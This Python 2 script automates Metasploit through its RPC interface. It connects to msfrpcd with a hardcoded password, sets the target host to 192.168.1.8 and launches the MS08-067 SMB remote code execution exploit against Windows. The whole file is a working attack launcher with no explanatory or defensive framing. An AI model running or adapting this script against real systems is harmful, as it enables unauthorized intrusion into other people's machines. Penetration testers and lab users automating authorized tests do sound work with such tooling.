#!/usr/bin/env python

import metasploit.msfrpc as mrc
import time

class BsMsf:
    def __init__ (self):
        self.cons =None
        self.consmsf()
        
    def consmsf(self):            #Connect MSF console
        argc = {"port":55552,"ssl":False}
        conn= mrc.MsfRpcClient("abc123", **argc)
        print conn
        self.cons = mrc.MsfConsole(conn, cid=None)
        print self.cons.cid.decode()
        
    def execute (self, com):
        self.cons.write(com)
        #time.sleep(2)
        while True:
            res = self.cons.read()
            while res['busy']:
                        time.sleep(10)
                        print self.cons.read()['busy']
            if len(res["data"]) > 1:
                    print res["data"]
                    break
        self.cons.read()
    def host (self,Host):
        self.execute("set RHOST " + Host)
            
    def exploit (self,exploit):
        tmp = "use "+ exploit
        self.execute(tmp)
        self.execute("exploit")
    

def main ():
     
    ms = BsMsf()
    ms.host("192.168.1.8")
    print 'rhost set'
    ms.exploit("exploit/windows/smb/ms08_067_netapi")

    
    


if __name__=="__main__":
    main()